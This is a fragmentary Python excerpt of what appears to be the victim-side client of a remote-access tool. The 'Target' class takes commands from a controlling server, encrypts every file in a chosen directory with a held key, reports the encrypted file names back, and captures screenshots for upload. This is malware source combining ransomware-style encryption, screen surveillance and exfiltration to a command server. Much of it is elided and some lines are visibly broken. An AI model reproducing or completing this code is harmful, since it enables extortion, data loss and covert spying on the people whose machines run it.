...
class Target:
    ...
    def send_json_encrypt_file_list(self, data):
        '''
        Sends data to the server, encrypting it first. This function will
        convert the data to json in order to account for any quotation
        marks or special characters.
    ...
    def send_json_capture(self, data):
        '''
        Sends data to the server with a special character at the end to prepare
        for a special action.
        param data: message for the server
        '''
        if(type(data) == bytes):
            data = data.decode("utf-8")
        ...
        for curr_command in commands:
            if not (curr_command == "" or curr_command == "\n" or curr_command.startswith("[No")):
                ...
                # Encrypts the specified file
                    ...
                    print(value)
                    if(value[1] == "-d" and len(value) > 2):
                        print("here")
                        message = "These files have been encrypted:\n"
                        results = self.execute_sys_command("ls " + value[2]).split()
                        print("Results: " + results)
                        for element in results:
                            print("Element: " + element)
                            if("." in element):
                                print(value[2] + "/" + element)
                                try:
                                    encrypt_file(value[2] + "/" + element, self.key)
                                    message += element + "\n"
                                except FileNotFoundError:
                                    self.send_json("The specified file path is invalid.\n")
                        if("." in message):
                            self.send_json_encrypt_file_list(message)
                    elif(value[1] == "-d" and len(value) == 2):
                        results = self.execute_sys_command("ls").split()
                        for element in results:
                            if("." in element):
                                try:
                                    encrypt_file(element, self.key)
                                    self.send_json_encrypt_file_list("File <" + element + "> encrypted.\n")
                                except FileNotFoundError:
                                    self.send_json("The specified file path is invalid.\n")
                    else:
                        try:
                ...
                # Do a screenshot
                	...
                	self.screen_capture()
                	self.send_json_capture("Preparing to receive capture")
                	
                	file_data = self.read_file("p.jpg")
                	self.receive()
